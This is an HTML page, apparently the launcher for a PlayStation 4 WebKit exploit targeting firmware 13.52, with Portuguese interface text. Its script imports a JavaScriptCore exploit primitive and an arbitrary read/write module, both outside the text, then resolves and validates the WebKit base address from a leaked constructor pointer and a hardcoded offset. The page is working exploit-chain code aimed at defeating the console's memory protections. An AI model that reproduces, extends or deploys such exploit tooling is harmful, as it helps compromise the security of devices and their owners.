<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 WebKit Exploit (Slopkit Port - 13.52 Validation)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        h1 {
            font-size: 18px;
            color: #00c8ff;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-bottom: 6px;
            text-align: center;
        }

        #fw-label {
            font-size: 11px;
            color: #666;
            margin-bottom: 18px;
            text-align: center;
            letter-spacing: 2px;
        }

        #status-bar {
            width: 100%;
            max-width: 700px;
            background: #111118;
            border: 1px solid #1e1e2e;
            border-radius: 6px;
            padding: 12px 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #444;
            flex-shrink: 0;
            transition: background 0.3s;
        }
        #status-dot.running  { background: #f0a500; animation: pulse 1s infinite; }
        #status-dot.ok       { background: #00c853; }
        #status-dot.error    { background: #ff3d3d; }

        @keyframes pulse {
            0%,100% { opacity: 1; }
            50%      { opacity: 0.3; }
        }

        #status-text {
            font-size: 13px;
            color: #ccc;
            flex: 1;
        }

        #attempt-bar {
            width: 100%;
            max-width: 700px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #444;
            margin-bottom: 12px;
            padding: 0 2px;
        }

        #console {
            width: 100%;
            max-width: 700px;
            height: 400px;
            background: #06060c;
            border: 1px solid #1a1a2e;
            border-radius: 6px;
            overflow-y: auto;
            padding: 10px 12px;
            font-size: 12px;
            line-height: 1.6;
            margin-bottom: 12px;
        }

        .log-line { padding: 1px 0; word-break: break-all; }
        .log-info    { color: #7ec8e3; }
        .log-ok      { color: #00c853; font-weight: bold; }
        .log-warn    { color: #f0a500; }
        .log-error   { color: #ff5252; font-weight: bold; }
        .log-dim     { color: #444; }
        .log-addr    { color: #bd93f9; }
        .log-section {
            color: #00c8ff;
            border-top: 1px solid #1a1a2e;
            margin-top: 6px;
            padding-top: 6px;
            letter-spacing: 1px;
        }

        #bases-grid {
            width: 100%;
            max-width: 700px;
            display: none;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-bottom: 12px;
        }
        #bases-grid.visible { display: grid; }

        .base-card {
            background: #0d0d1a;
            border: 1px solid #1e1e3a;
            border-radius: 6px;
            padding: 10px 14px;
        }
        .base-card .label {
            font-size: 10px;
            color: #555;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 4px;
        }
        .base-card .value {
            font-size: 13px;
            color: #bd93f9;
            word-break: break-all;
        }
        .base-card .value.na { color: #333; }
    </style>
</head>
<body>

<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw-label">aguardando firmware...</div>

<div id="status-bar">
    <div id="status-dot"></div>
    <div id="status-text">Inicializando...</div>
</div>

<div id="attempt-bar">
    <span id="attempt-text">tentativa: —</span>
    <span id="stage-text">estágio: —</span>
</div>

<div id="console"></div>

<div id="bases-grid">
    <div class="base-card">
        <div class="label">WebKit Base</div>
        <div class="value na" id="card-webkit">—</div>
    </div>
    <div class="base-card">
        <div class="label">__ps5NativeCtor</div>
        <div class="value na" id="card-ctor">—</div>
    </div>
</div>

<!-- Carrega o arquivo de offsets na raiz antes do módulo principal -->
<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 } from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP } from './resources/mem.js';

globalThis.int64 = int64;

const $console    = document.getElementById('console');
const $dot        = document.getElementById('status-dot');
const $statusText = document.getElementById('status-text');
const $attemptTxt = document.getElementById('attempt-text');
const $stageTxt   = document.getElementById('stage-text');
const $fwLabel    = document.getElementById('fw-label');
const $basesGrid  = document.getElementById('bases-grid');

function log(msg, cls = 'log-info') {
    const el = document.createElement('div');
    el.className = 'log-line ' + cls;
    el.textContent = msg;
    $console.appendChild(el);
    $console.scrollTop = $console.scrollHeight;
}

function setStatus(msg, state = 'running') {
    $statusText.textContent = msg;
    $dot.className = state;
}

function setCard(id, value) {
    const el = document.getElementById(id);
    if (!el) return;
    el.textContent = value;
    el.classList.remove('na');
}

const ua = navigator.userAgent;
let fwStr = '13.52';
const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
if (fwMatch) fwStr = fwMatch[1];
$fwLabel.textContent = `PlayStation 4 — firmware ${fwStr}`;

function getWebKitPointer(p) {
    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor === 'number' && ctor > 0x100000000) {
        const hi = Math.floor(ctor / 0x100000000);
        const lo = ctor - hi * 0x100000000;
        const ptr = new int64(lo >>> 0, hi >>> 0);
        log('[+] __ps5NativeCtor recuperado: 0x' + ptr.toString(), 'log-addr');
        setCard('card-ctor', '0x' + ptr.toString());
        return ptr;
    }
    return null;
}

async function validateBases(p) {
    log('', '');
    log('-- VALIDAÇÃO DO OFFSET EXATO 13.52 ------------', 'log-section');

    const wkPtr = getWebKitPointer(p);
    if (!wkPtr) {
        setStatus('Falha: __ps5NativeCtor não capturado.', 'error');
        return null;
    }

    const ctorNumber = wkPtr.hi * 0x100000000 + wkPtr.low;
    const resolvedBase = ctorNumber - OFFSET_wk_host_constructor;

    if (resolvedBase >= 0x800000000 && resolvedBase < 0x900000000 && resolvedBase % 0x4000 === 0) {
        const webkitBase = new int64(resolvedBase % 0x100000000, Math.floor(resolvedBase / 0x100000000));
        log(`[+] WebKit Base resolvida com sucesso: 0x${webkitBase.toString()}`, 'log-ok');
        log(`[+] Alinhamento verificado (% 0x4000 == 0): OK`, 'log-ok');
        setCard('card-webkit', '0x' + webkitBase.toString());
        $basesGrid.classList.add('visible');
        return webkitBase;
    } else {
        log(`[-] Base calculada inválida ou desalinhada: 0x${resolvedBase.toString(16)}`, 'log-error');
        return null;
    }
}

function onCoreEvent(tag, detail, attempt) {
    if (attempt !== undefined)
        $attemptTxt.textContent = `tentativa: ${attempt}`;
    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
    log(`[${tag}] ${detail}`, 'log-info');
}

(async () => {
    log(`Iniciando validação para o firmware ${fwStr}...`, 'log-info');
    setStatus('Executando exploit JSC...', 'running');

    let carrier;
    try {
        carrier = await establishPrimitive({
            onEvent: onCoreEvent,
            maxAttempts: 0
        });
    } catch (err) {
        setStatus('core.js falhou: ' + err.message, 'error');
        log('[ERRO] ' + err.message, 'log-error');
        return;
    }

    log('[+] Primitiva JSC estabelecida com sucesso!', 'log-ok');
    setStatus('Instalando R/W arbitrário...', 'running');

    let p;
    try {
        p = installWindowP(carrier, { promote: true });
    } catch (err) {
        setStatus('mem.js falhou: ' + err.message, 'error');
        log('[ERRO] ' + err.message, 'log-error');
        return;
    }

    log('[+] window.p pronto. Validando offset...', 'log-ok');
    
    let base = await validateBases(p);
    if (base) {
        setStatus('Validação concluída com sucesso! Offset correto.', 'ok');
        log('✔ O offset 0x36F9E20 mapeou a base perfeitamente.', 'log-ok');
    } else {
        setStatus('Falha na validação da base.', 'error');
    }
})();
</script>
</body>
</html>
